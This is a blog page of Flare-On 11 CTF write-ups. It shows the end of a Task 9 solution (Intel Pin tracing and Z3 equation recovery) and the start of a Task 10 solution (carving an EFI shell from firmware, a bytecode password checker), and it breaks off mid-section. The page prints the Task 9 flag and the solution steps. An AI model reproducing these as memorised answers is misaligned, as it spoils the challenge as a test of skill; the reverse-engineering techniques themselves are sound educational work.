Before we add the new sections, the challenge executable also needs some adjustments. Originally the shellcode is loaded into dynamically allocated memory – now we want it to load from the static address: a new section attached to the PE. This requires patching of the function that did the loading. Another issue is, since the shellcode is now the part of the PE image, its exceptions will be managed by the Exception Table from the PE headers. In order to register the custom exception handlers, we need to first remove the existing Exception Table from Data Directory, The patched binary may look in the following way: [serpentine\_shc\_static\_base.exe](https://github.com/hasherezade/flareon2024/blob/main/task9/deobfuscator/serpentine_shc_static_base.exe)

After those adjustments we are ready to add the new sections.

Section 1 – the “original” shellcode:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/shc1.png?w=805)

Section 2 – the deobfuscated shellcode:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/shc2.png?w=802)

The jumps are the replacements for each HLT instruction, and they cause execution of HLT within the first section. The rest of the code executes in a linear way, and is easy to observe under the debugger.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/deobf_sec.png?w=448)

## The logic of password verification

At this point we can notice that the password verification is done in 32 roughly similar blocks. Each block ends with the comparison:

```
movabs r15, 0x1400011f0 ; R15 -> wrong_password
test r14, r14; is result 0?
lea r12, [rip  + 0x7]
cmovne r12, r15; if not, move the offset to wrong_password to r12
jmp r12; jump to R12
```

During the execution of the block, some chunks of the input are being fetched and processed. The result of executed calculations must be equal to 0, otherwise the program jumps to the function displaying “Wrong password” message.

The goal of the task becomes clearer: we need to reconstruct those 32 equations, and resolve them. But since it is so much code, it is impossible to do it manually. Some sort of automated tracing is needed. For this purpose I decided to use Intel Pin.

By definition, we can trace only the code that was executed: so we have to make the execution proceed till the end regardless of the given input. I did it by simply NOP-ing out the lines containing CMOVNE. The modified binary can be found in the repository: [serpentine4\_p1.exe](https://github.com/hasherezade/flareon2024/blob/main/task9/equations_builder/serpentine4_p1.exe).

## Dumping equations with a PIN tracer

_Full implementation of the tracer is available here: [https://github.com/hasherezade/flareon2024/tree/main/task9/equations\_builder](https://github.com/hasherezade/flareon2024/tree/main/task9/equations_builder)_

**Intro**

Pin Tracers are modules that are injected into a compiled application when it runs under the control of [Intel Pin](https://www.intel.com/content/www/us/en/developer/articles/tool/pin-a-dynamic-binary-instrumentation-tool.html). They allow to intercept the execution of the target, and run our instrumentation function at every monitored event – before or after its execution. Pin allows to set callbacks at different granularity levels. We can watch not only every new module being loaded, every API function being called, but also every single instruction being executed. One example of a general-purpose Pin Tracer is [TinyTracer, available on my Github](https://github.com/hasherezade/tiny_tracer/). While it has rich capabilities, sometimes we can benefit more from writing tracers tailored for the specific task – and this is what I am gonna demonstrate in this part.

At this point, the goal was to understand what operations are being applied on the input, and reconstruct the equations as close as possible in the way they can be used with the [Z3 Solver](https://github.com/Z3Prover/z3).

Since we have the whole password checking logic isolated in the newly added, cleaned section, I will watch the instructions executed within this boundary, and how do they change the context.

**Initial tracer**

First, we add the instrumentation function that will work [at instruction granularity level](https://software.intel.com/sites/landingpage/pintool/docs/98547/Pin/html/group__INS__INSTRUMENTATION.html#ga1333734dbf7d552365a24cd945d5691d):

|     |     |
| --- | --- |
| 1<br>2 | `// Register function to be called before every instruction`<br>`INS_AddInstrumentFunction(InstrumentInstruction, NULL);` |

The `InstrumentInstruction` is responsible for registering the callback function `LogInstruction`. It will get called prior to the every instruction execution (`IPOINT_BEFORE`) and get two arguments: the current context (`IARG_CONTEXT`), and the instruction disassembly.

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20 | `VOID``InstrumentInstruction(INS ins,``VOID``* v)`<br>`{`<br>```const``IMG pImg = IMG_FindByAddress(INS_Address(ins));`<br>```BOOL``inWatchedModule = FALSE;`<br>```if``(!IMG_Valid(pImg) || IMG_IsMainExecutable(pImg))`<br>```{`<br>```inWatchedModule = TRUE;`<br>```}`<br>```// only the main module`<br>```if``(inWatchedModule && g_disasmStart) {`<br>```INS_InsertCall(`<br>```ins,`<br>```IPOINT_BEFORE, (AFUNPTR)LogInstruction,`<br>```IARG_CONTEXT,`<br>```IARG_PTR,``new``std::string(INS_Disassemble(ins)),`<br>```IARG_END`<br>```);`<br>```}`<br>`}` |

All the important stuff related to the tracing happens withing this defined callback. At first, I simply logged all what is happening.

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24 | `VOID``LogInstruction(``const``CONTEXT* ctxt, std::string* disasmStr)`<br>`{`<br>```if``(!disasmStr)``return``;`<br>```const``char``* disasm = disasmStr->c_str();`<br>```if``(!disasm)``return``;`<br>```PinLocker locker;`<br>```const``ADDRINT Address = (ADDRINT)PIN_GetContextReg(ctxt, REG_INST_PTR);`<br>```const``ADDRINT base = get_mod_base(Address);`<br>```if``(base == UNKNOWN_ADDR) {`<br>```return``;`<br>```}`<br>```const``ADDRINT rva = Address - base;`<br>```// ensure that we are within boundaries of interest:`<br>```if``(rva < g_disasmStart || rva > g_disasmStop) {`<br>```return``;`<br>```}`<br>```// log the context as it was before executing the instruction:`<br>```traceLog.logLine(``"\t\t\t\t"``+ dumpContext(disasm, ctxt));`<br>```// log the disassembly:`<br>```traceLog.logInstruction(base, rva, disasm);`<br>`}` |

The function `dumpContext` was designed to print changes in the registers at each step. As it goes, it produces a TAG file, similar by the one created by TinyTracer.

After we built the tracer, we run the patched serpentine.exe under its control, passing it a test input:

|     |     |
| --- | --- |
| 1 | `C:\pin\pin.exe -t C:\pin\source\tools\pin_tracer\x64\Release\Task9Tracer.dll -- serpentine4_p1.exe 0123456789ABCDEF1112211122111221` |

Example of the produced tracelog (fragment):

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22 | ```{ [rsp] -> 7ff9aa2728bf; rsi = 67ffc70 rbp = 67ff5b0 rsp = 67ff038 rdx = 67ffea8 rcx = 67ffc70 rax = 1408aa098 r8 = 67ff780 r9 = 67ff600 r10 = 67ff0e0 r11 = 67ff060 r12 = 1408aa098 r14 = 67ff0b0 r15 = 67ff780  }`<br>`10aa005;mov r11, 0x10add7f49`<br>```{ r11 = 10add7f49  }`<br>`10aa00f;push r11`<br>```{ [rsp] -> 10add7f49; rsp = 67ff030  }`<br>`10aa011;push 0x73775436`<br>```{ [rsp] -> 73775436; rsp = 67ff028  }`<br>`10aa016;push 0x68a04c43`<br>```{ [rsp] -> 68a04c43; rsp = 67ff020  }`<br>`10aa01b;push 0x12917ff9`<br>```{ [rsp] -> 12917ff9; rsp = 67ff018  }`<br>`10aa020;add qword ptr [rsp+0x18], 0x35ac399f`<br>``<br>`10aa029;jmp 0x1408aa107`<br>```{ [rsp] -> 7ff9aa2728bf; rsi = 67fedf0 rbp = 67fe730 rsp = 67fe1b8 rdx = 67ff018 rcx = 67fedf0 rax = 1408aa1a7 r8 = 67fe900 r9 = 67fe780 r10 = 1408aa107 r11 = 67fe1e0 r12 = 1408aa1a7 r14 = 67fe230 r15 = 67fe900  }`<br>`10aa02e;mov rbp, qword ptr [r9+0x28]`<br>```{ rbp = 67fe230  }`<br>`10aa032;mov rdi, qword ptr [rbp+0xe0]`<br>```{ rdi = 4241393837363534  }`<br>`10aa039;movzx rdi, dil`<br>```{ rdi = 34  }`<br>`[...]` |

The jumps (i.e. `jmp 0x1408aa107`) redirect to the original section, that calls the HLT instruction, triggering the context change. So on return, we have the complete context printed. Further on, only the registers that has changed are printed, to keep the tracing more focused.

In the above fragment, we can already see some part of the supplied input (“0123456789ABCDEF1112211122111221”) being loaded into the registers:

|     |     |
| --- | --- |
| 1<br>2<br>3 | ```{ rdi = 4241393837363534  } -> "BA987654"`<br>`10aa039;movzx rdi, dil`<br>```{ rdi = 34  } -> '4'` |

Since I wanted to automatically recognize at what index the particular byte of the input is, I added additional option to the tracer (enabled with `-c`). It requires a hardcoded string to be passed as the input: `0123456789ABCDEFabcdefghijklmopq` and does the automatic lookup, finding the position of the character.

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9 | `int getValIndx(ADDRINT rax)`<br>`{`<br>```char str[] = "0123456789ABCDEFabcdefghijklmopq";`<br>```const size_t len = strlen(str);`<br>```for (int i = 0; i < len; i++) {`<br>```if (rax == ADDRINT(str[i])) return i;`<br>```}`<br>```return (-1);`<br>`}` |

Now, when run with this flag, the tracer displays automatically that we are dealing with i.e. x\_4 – the 4th character of the input.

After some experiments I started to notice the patterns, and pinpointed the lines where the important operations are happening.

Each of the 32-bit equations operates on 8 different characters of the input. The first operation done to each character is multiplication with a constant. There are no other multiplications in the code, so we can be sure that whenever this instruction occurs, it is used to process a byte of the input.

I logged those lines with a tracer, and stored the output of the multiplication, to check how it is used later.

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15 | ```{ rdi = 4241393837363534  }`<br>`10aa039;movzx rdi, dil`<br>```{ rdi = 34  }`<br>`10aa03d;jmp 0x1408aa20a`<br>```{ rdi = 0 rsi = 67fdf70 rbp = 67fd8b0 rsp = 67fd338 rdx = 67fe1b8 rcx = 67fdf70 rax = 1408aa2a2 r8 = 67fda80 r9 = 67fd900 r10 = 67fd3e0 r11 = 67fd360 r12 = 1408aa2a2 r14 = 67fd3b0 r15 = 67fda80  }`<br>`10aa042;mov r8, qword ptr [r9+0x28]`<br>```{ r8 = 67fd3b0  }`<br>`10aa046;mov rax, qword ptr [r8+0xb0]`<br>```{ rax = 34  }`<br>`10aa04d;mov r10, 0xef7a8c`<br>```{ r10 = ef7a8c  }`<br>`10aa054;push r10`<br>```{ [rsp] -> ef7a8c; rsp = 67fd330  !!! TRACKED_MULTIPLYING: #[ res = x_4  * 0xef7a8c ] // [CNTR: 0]  }`<br>`10aa056;mul qword ptr [rsp]`<br>```{ rdx = 0 rax = 30a4e470  !!! MUL_RES: 30a4e470 }` |

**Reconstructing the equations**

Since the context is rewritten on each HLT, and the tracer treats all the changes made by the unwind codes as black boxes, we can’t really follow the operations in a way typical to taint analysis. But we can still notice how the results change.

Each equation consists of 8 multiplication operations. They are done each time a new character of the input is loaded. The result of each multiplication is processed by some operations. Then it is merged with another multiplication result, by either being added, substracted, or XORed. While some of the operations are easy to spot in the code, other are hard to track, but we can deduce them from the observed results.

I modified the tracer to follow the consecutive results, and constructed additional file ( [.listing.txt](https://github.com/hasherezade/flareon2024/blob/main/task9/equations_builder/listings/t1/serpentine4_p1.exe.listing.txt)) with log focused only on the performed operations. The detailed log ( [.tag](https://github.com/hasherezade/flareon2024/blob/main/task9/equations_builder/listings/t1/serpentine4_p1.exe.tag)) will be used as a reference.

The first equation logged by the listing looks in the following way (full listing [here](https://github.com/hasherezade/flareon2024/blob/aef1969f228c7fe44359d86a37ad328a3e2a0f04/task9/equations_builder/listings/t1/serpentine4_p1.exe.tag.listing.txt)):

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25 | `res = x_4  * 0xef7a8c`<br>`m = x_24  * 0x45b53c`<br>`#[ res += 0x9d865d8d ; res -= 0x6279a273 ;  res ^= 0xfe8fa58d ]`<br>`res -= m`<br>`m = x_0  * 0xe4cf8b`<br>`#[ res += 0x18baee57 ; res -= 0xe74511a9 ;  res ^= 0x7bdd36d9 ]`<br>`res -= m`<br>`m = x_8  * 0xf5c990`<br>`#[ res += 0x6ec04422 ; res -= 0x913fbbde ;  res ^= 0x914fc462 ]`<br>`res -= m`<br>`m = x_20  * 0x733178`<br>`#[ res += 0x6bfaa656 ; res -= 0x940559aa ;  res ^= 0x9c3adeea ]`<br>`res ^= m`<br>`m = x_16  * 0x9a17b8`<br>`#[ res += 0x9fa354cb ; res -= 0x605cab35 ;  res ^= 0x61e3db3b ]`<br>`res ^= m`<br>`m = x_12  * 0x773850`<br>`#[ res += 0x35d7fb4f ; res -= 0xca2804b1 ;  res ^= 0x5a283bb1 ]`<br>`res ^= m`<br>`m = x_28  * 0xe21d3d`<br>`#[ res += 0xb622a84a ; res -= 0x49dd57b6 ;  res ^= 0x5a6f68be ]`<br>`res ^= m`<br>`#[ res += 0x420a6868 ; res -= 0xbdf59798 ;  res ^= 0xc2359898 ]`<br>`###` |

The lines starting with ‘#’ denote the operations that are deduced by the changes in the output. We are not really sure which of the operations was used, that’s why multiple options are shown in the log. In most cases, this gets clarified when we create logs with different inputs, and compare them.

Example – log of the same equation generated with a different input (full listing [here](https://github.com/hasherezade/flareon2024/blob/main/task9/equations_builder/listings/t2/serpentine4_p1.exe.listing.txt)):

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25 | `res = 23 * 0xef7a8c`<br>`m = 23 * 0x45b53c`<br>`#[ res += 0x9d865d8d ; res -= 0x6279a273 ;  res ^= 0x9ef9df95 ]`<br>`res -= m`<br>`m = 23 * 0xe4cf8b`<br>`#[ res += 0x18baee57 ; res -= 0xe74511a9 ;  res ^= 0x79cb12a9 ]`<br>`res -= m`<br>`m = 23 * 0xf5c990`<br>`#[ res += 0x6ec04422 ; res -= 0x913fbbde ;  res ^= 0xb2c1cc26 ]`<br>`res -= m`<br>`m = 23 * 0x733178`<br>`#[ res += 0x6bfaa656 ; res -= 0x940559aa ;  res ^= 0x9c1bdade ]`<br>`res ^= m`<br>`m = 23 * 0x9a17b8`<br>`#[ res += 0xa022d6d5 ; res -= 0x5fdd292b ;  res ^= 0x61e3db3b ]`<br>`res ^= m`<br>`m = 23 * 0x773850`<br>`#[ res += 0x35d7fb4f ; res -= 0xca2804b1 ;  res ^= 0x4dd804cf ]`<br>`res ^= m`<br>`m = 23 * 0xe21d3d`<br>`#[ res += 0xda62e782 ; res -= 0x259d187e ;  res ^= 0x5a6f68be ]`<br>`res ^= m`<br>`#[ res += 0xd30c9a66 ; res -= 0x2cf3659a ;  res ^= 0xdd0ca6aa ]`<br>`###` |

Some constants in the parts in question repeat in both, so we can guess they give away the valid operations. I created another script in Python to merge the listings: [cleanup.py](https://github.com/hasherezade/flareon2024/blob/main/task9/equations_builder/cleanup.py).

This is how the first generated equation looks like:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23 | `res_0 = x_4  * 0xef7a8c`<br>`m = x_24  * 0x45b53c`<br>`res_0 += 0x9d865d8d`<br>`res_0 -= m`<br>`m = x_0  * 0xe4cf8b`<br>`res_0 += 0x18baee57`<br>`res_0 -= m`<br>`m = x_8  * 0xf5c990`<br>`res_0 += 0x6ec04422`<br>`res_0 -= m`<br>`m = x_20  * 0x733178`<br>`res_0 += 0x6bfaa656`<br>`res_0 ^= m`<br>`m = x_16  * 0x9a17b8`<br>`res_0 ^= 0x61e3db3b`<br>`res_0 ^= m`<br>`m = x_12  * 0x773850`<br>`res_0 += 0x35d7fb4f`<br>`res_0 ^= m`<br>`m = x_28  * 0xe21d3d`<br>`res_0 ^= 0x5a6f68be`<br>`res_0 ^= m`<br>`WARNING: no common part` |

Full listing: [t1\_vs\_t2.txt](https://github.com/hasherezade/flareon2024/blob/main/task9/equations_builder/listings/t1_vs_t2.txt) .

While it gave multiple valid equations, there are still some unresolved cases, where no common part was found. The reason of such situation can be understood by following the main trace (.tag) in more details.

**Filling the missing parts**

The deduced operations are just an attempt to summarize the changes done to the result between two points of observation. We know what was the value before, and what was the value after, but we weren’t able to trace all what happened in between – so we only print some options of what was possibly added, substracted or XORed to get that result:

|     |     |
| --- | --- |
| 1 | `#[ res += 0x420a6868 ; res -= 0xbdf59798 ;  res ^= 0xc2359898 ]` |

Then, comparing traces done with different input, we pick one of the options that repeat in both. It can give a sufficient approximation in most of the cases, but will fail on some.

In reality, there were multiple operations done to our result in between those two different points of observation. If those operations are of the same type, we can summarize them as one. For example, if the value is changed by ADD const\_1 and then by SUB const\_2:

|     |     |
| --- | --- |
| 1<br>2 | `res += const_1`<br>`res -= const_2` |

They can be summarized as one operation:

|     |     |
| --- | --- |
| 1 | `res += const_3 ; where const_3 = const_1 - const_2` |

The same happens when there are multiple XOR operations applied:

|     |     |
| --- | --- |
| 1<br>2<br>3 | `res ^= const_1`<br>`res ^= const_2`<br>`res ^= const_3` |

Can be summarized as:

|     |     |
| --- | --- |
| 1 | `res ^= const_4 ; where const_4 = const_1 ^ const_2 ^ const_3` |

So having just two points of observation of the res value – before and after the set of operations – is sufficient to deduce a valid constant.

But there are rare cases when this won’t give a valid result. For example, if the value is changed first by XOR with const1 and then by SUB with const2. They are not transitive, and they cannot be replaced by one operation on const3. Comparing traces with different input, we can see that the attempt to aggregate those operations as one doesn’t give a consistent result. Script will print “no common part”. It means, we need more points of observation. Instead of trying to compress the changes to one value, and one operation, we will split it on as many sub-operations as it is required, to again get consistent results between traces with different input.

Automating this part of tracing was more problematic. Fortunately, the number of such missing cases is small enough, so I decided to do this search manually, and only enrich the tracelog to help me out a bit.

The cases with “no common part” always happen at the end of the equation: between the last multiplication, and the comparison of the result to 0 (TEST operation). So, for those parts of code, I enabled more detailed logging:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17 | `bool``arithm =``false``;`<br>`if``(disasm.find(``"sub "``) == 0 ||`<br>```disasm.find(``"add "``) == 0 ||`<br>```disasm.find(``"xor "``) == 0 ||`<br>```disasm.find(``"or "``) == 0 ||`<br>```disasm.find(``"and "``) == 0`<br>```)`<br>`{`<br>```arithm =``true``;`<br>`}`<br>`bool``isArithmTrackingEnabled = (mulCntr == 7) ?``true``:``false``;`<br>`if``(isArithmTrackingEnabled && arithm) {`<br>```ss <<``" TRACKED_ARITHM: "``<< disasm;`<br>`}`<br>`if``(isArithmTrackingEnabled && isPrevArithm && anyChanged) {`<br>```ss <<``" TRACKED_ARITHM_RES "``;`<br>`}` |

The logged lines are marked with the keyword “TRACKED\_ARITHM” that will make them easier to find in the whole .tag file.

This is the fragment that I’ve got tracking all the above operations done at the end of the first equation.

[https://github.com/hasherezade/flareon2024/blob/aef1969f228c7fe44359d86a37ad328a3e2a0f04/task9/equations\_builder/listings/track.txt#L20](https://github.com/hasherezade/flareon2024/blob/aef1969f228c7fe44359d86a37ad328a3e2a0f04/task9/equations_builder/listings/track.txt#L20)

The first point of observation is just after the last MUL:

|     |     |
| --- | --- |
| 1<br>2<br>3 | `{ rbp = ffffffff2dd98f84  !!! TRACKED_MULTIPLYING: #[ m = 6d * 0xe21d3d ]  UNK: #[ res -= 0x49dd57b6 ;  res ^= 0x5a6f68be ] // [CNTR: 7]  }`<br>`{ r12 = ffffffff2dd98f84  TRACKED_CHANGED BY: xor r12, qword ptr [rdi+0xd8] #[ res ^= m ]  TRACKED_ARITHM: xor r12, qword ptr [rdi+0xd8] }`<br>`{ r12 = ffffffff4d9ffd7d  TRACKED_CHANGED  -> VAL: ffffffff4d9ffd7d TRACKED_ARITHM_RES  }` |

Next point of observation is somewhere in between, and we have to find it by looking at the log from different operations.

|     |     |
| --- | --- |
| 1<br>2<br>3 | `{ r14 = ffffffff110ee05e  TRACKED_ARITHM_RES  }`<br>`{ [rsp]  -> f4732f0; rsp = 66f5790  TRACKED_ARITHM: add qword ptr [rsp+0x20], 0xe565b33 }` |

The final point of observation is just before the value gets tested:

|     |     |
| --- | --- |
| 1<br>2 | `{ r12 = ffffffff8faa65e5  TRACKED_ARITHM_RES  }`<br>`{ r15 = 1400011f0  TRACKED_TEST r14 = ffffffff8faa65e5 UNK: #[ res += 0x420a6868 ;  res ^= 0xc2359898 ]  }` |

Now instead of two points of observations, I have 3:

|     |     |
| --- | --- |
| 1<br>2<br>3 | `res_0 = 0xffffffff4d9ffd7d`<br>`res_0 = 0xffffffff110ee05e`<br>`res_0 = 0xffffffff8faa65e5` |

I created another code snippet where I manually pasted values from different equations and different traces:

[https://github.com/hasherezade/flareon2024/blob/aef1969f228c7fe44359d86a37ad328a3e2a0f04/task9/equations\_builder/test.cpp](https://github.com/hasherezade/flareon2024/blob/aef1969f228c7fe44359d86a37ad328a3e2a0f04/task9/equations_builder/test.cpp)

This allowed me to find a set of two operations with the help of which I can summarize how the result has changed:

|     |     |
| --- | --- |
| 1<br>2 | `res_0 ^= 0x5C911D23`<br>`res_0 += 0x7E9B8587` |

I repeated those steps with several different equations that had the missing part at the end.

Finally, my solver got complete enough: [task9\_z3s.py](https://github.com/hasherezade/flareon2024/blob/aef1969f228c7fe44359d86a37ad328a3e2a0f04/task9/task9_z3s.py) – and it was able to print the flag:

|     |     |
| --- | --- |
| 1 | `$$_4lway5_k3ep_mov1ng_and_m0ving` |

Posted in [CrackMe](https://hshrzd.wordpress.com/category/crackme/), [CTF](https://hshrzd.wordpress.com/category/ctf/), [FlareOn](https://hshrzd.wordpress.com/category/ctf/flareon/)\|Tagged [FlareOn](https://hshrzd.wordpress.com/tag/flareon/), [FlareOn11](https://hshrzd.wordpress.com/tag/flareon11/)\|[2 Comments](https://hshrzd.wordpress.com/2024/10/29/flareon-11-task-9/#comments)

## [Flare-On 11 – Task 10](https://hshrzd.wordpress.com/2024/10/27/flare-on-11-task-10/)

Posted on [October 27, 2024](https://hshrzd.wordpress.com/2024/10/27/flare-on-11-task-10/ "5:34 pm") by[hasherezade](https://hshrzd.wordpress.com/author/hshrzd/ "View all posts by hasherezade")

_[Flare-On](https://flare-on.com/) is an annual CTF run by [Mandiant Flare Team](https://cloud.google.com/blog/topics/threat-intelligence/flareon-11-challenge-solutions). In this series of writeups I present solutions to some of my favorite tasks from this year. All the sourcecodes are available on my Github, in dedicated repository: [flareon2024](https://github.com/hasherezade/flareon2024)_.

The recent, 11-th edition, had 10 tasks. The final one was named “Catbert Ransomware”:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/task10_info.png?w=723)

We are provided with two files: `bios.bin` containing firmware, and `disk.img` containing the disk. We can run it with the help of QEMU:

|     |     |
| --- | --- |
| 1 | `qemu-system-x86_64 -drive``file``=disk.img,``format``=raw -bios bios.bin` |

The firmware boots and we are prompted with the following message:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/message.png?w=631)

By the command:

|     |     |
| --- | --- |
| 1 | `fs0:` |

We can enter to the mounted `disk.img`. Listing its main directory shows 4 files: three cat memes, encrypted, with a .c4tb extension, and an EFI binary, also encrypted but with a different algorithm.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/files.png?w=481)

The initial message says that we are supposed to decrypt the .c4tb files, using a decryption tool that is available within this shell. Let’s first find this utility. Using the command `help` we can list all available commands. By \[Page Up\] and \[Page Down\] we can roll the screen back and forth, and see the initial commands. Among them, there is one especially interesting:

|     |     |
| --- | --- |
| 1 | `decrypt_file  - Decrypts a user chosen .c4tb file from a mounted storage, given a decryption key.` |

This tool can decrypt our files, but it is not gonna be that easy. First, we need to find an appropriate password for each of them. This requires diving deeper into the code implementing the decryption process.

## Finding the shell binary

At this point we are sure that the binary we are looking for is somewhere in the bios.bin. I started by extracting its content by binwalk:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9 | `$ binwalk bios.bin -e`<br>`DECIMAL       HEXADECIMAL     DESCRIPTION`<br>`--------------------------------------------------------------------------------`<br>`0             0x0             UEFI PI Firmware Volume, volume size: 540672, header size: 0, revision: 0, Variable Storage, GUID: FFF12B8D-7696-4C8B-85A9-2747075B4F50`<br>`540672        0x84000         UEFI PI Firmware Volume, volume size: 3440640, header size: 96, revision: 0, EFI Firmware File System v2, GUID: 8C8CE578-8A3D-4F1C-3599-896185C32DD3`<br>`540840        0x840A8         LZMA compressed data, properties: 0x5D, dictionary size: 16777216 bytes, uncompressed size: 16122000 bytes`<br>`3981312       0x3CC000        UEFI PI Firmware Volume, volume size: 212992, header size: 96, revision: 0, EFI Firmware File System v2, GUID: 8C8CE578-8A3D-4F1C-3599-896185C32DD3`<br>`3981460       0x3CC094        Microsoft executable, portable (PE)` |

Binwalk created a directory with extracted contents:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/bios_extracted.png?w=322)

If we open the first binary (`840A8`) in hexeditior, we can see that it contains plenty of different PE files. Many of them have strings referencing the the project:

[https://github.com/tianocore/edk2/](https://github.com/tianocore/edk2/) and suggesting that the challenge has been created upon this base. Most of those binaries are not relevant to the main problem of the task.

Let’s try to pinpoint the exact module that will be responsible for processing the .c4tb files. A command that may be of help is the hexeditor available from within the shell:

|     |     |
| --- | --- |
| 1 | `hexedit       - Provides a full screen hex editor for files, block devices, or memory.` |

With its help we can see that every .c4tb binary starts with the magic

“C4TB”. We can guess that the binary responsible for the decryption will start validating the input by checking for the presence of this marker. Let’s see if any of the binaries in the decompressed bios references this magic number:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/marker_found.png?w=618)

The marker was found. We can assume that it is inside the PE that processes the .c4tb files. Let’s find the beginning of this PE, by searching for the MZ signature backwards from the marker.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/pe_found.png?w=619)

Having the offset, I just carved out the relevant PE and opened it in IDA. The PDB confirms that it is the shell executable.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/pdb_path.png?w=777)

By following where the previously found marker is referenced, I pinpointed the routine responsible for password verification.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/marker_check.png?w=547)

The same function contains other familiar strings that were displayed on the attempt of decrypting a file with `decrypt_file` utility. This confirms that it is indeed the part of code we were looking for:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/marker_check_disasm.png?w=878)

Following the flow of the function, we an see the routine that seems to be used for password verification:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/to_pass_check.png?w=546)

This routine turns out to be interesting. It consists of the main loop, that parses given arguments, and executes operations depending on the content of the first argument. It reminds of a small VM, processing some bytecode.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/arithmetic.png?w=640)

And where is this bytecode located? It turns out that it is in the `.c4tb` file itself! The code just before the verification function parses the header at the beginning of the provided file:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/file_buf.png?w=522)

After the magic (C4TB) marker, there are 3 other DWORDs. The whole structure can be summarized as:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6 | `struct``c4tb_hdr{`<br>```DWORD``magic;`<br>```DWORD``dataSize;`<br>```DWORD``codeOffset;`<br>```DWORD``codeSize;`<br>`};` |

It turns out the relevant bytecode is appended at the end of the file, after the block of encrypted data. It is pointed by the offset stored in the header. The bytecode itself implements the password verification program.

The password is always 16 characters long. It is filled in the bytecode, each character at predefined offset.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/fill_pass-1.png?w=535)

## Running the verification function

At this point I decided that it will be best to run this function and watch it in action. The shell module is a regular PE. However it is an EFI executable, so it can’t be just run in usermode. Still, the function we are interested in does not have any dependencies, and it is an Intel 64 bit code.

There are various options to run it. We can i.e. emulate it by [Unicorn Engine](https://www.unicorn-engine.org/). But I realized that it is going to be much simpler and faster to load it natively, and watch under a usermode debugger. For the purpose of loading I used [LibPEConv](https://github.com/hasherezade/libpeconv/).

I started with a very simple loader, created basing on [the template from my Github](https://github.com/hasherezade/libpeconv_tpl). [The loader, written in C++](https://gist.github.com/hasherezade/2f60f81711bfc9831c479b5659b4f990), will host the original Shell binary, and use it to deploy the bytecode read from the given C4TB files. From the previous analysis of the Shell, we know the RVA of the function that runs the bytecode (denoted as `verify_pass`). So, we can export it by the offset, and use like any other local function.

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16 | `#define FUNC_OFFSET 0x31274`<br>`int``process()`<br>`{`<br>```if``(!g_Payload) {`<br>```std::cerr <<``"[!] The payload is not loaded!\n"``;`<br>```return``-1;`<br>```}`<br>```const``ULONG_PTR``func_va = (``ULONG_PTR``)g_Payload + FUNC_OFFSET;`<br>```//prototype of the function:`<br>```int``verify_pass(``void``);`<br>```//fetch the function:`<br>```auto``_verify_pass =``reinterpret_cast``<``decltype``(&verify_pass)>(func_va);`<br>```//run it:`<br>```return``_verify_pass();`<br>`}` |

We still need to fill in some global variables that the verification function expects. Firstly, we must be able to pass the C4TB file to be executed. The offset to the bytecode within the loaded content needs to be set in a global variable within the Shell executable. This can be done easily, just writing at the known offset of this global variable.

Once we have the bytecode loaded and attached, the verification function is ready to run. For the sake of experiments, we will like to use a custom supplied password, and try it with the verification function. Knowing from the previous analysis at what offsets each character of the password is filled into the bytecode, we can implement a custom function that sets it. The complete snippet illustrating all the needed preparation steps:

|     |     |
| --- | --- |
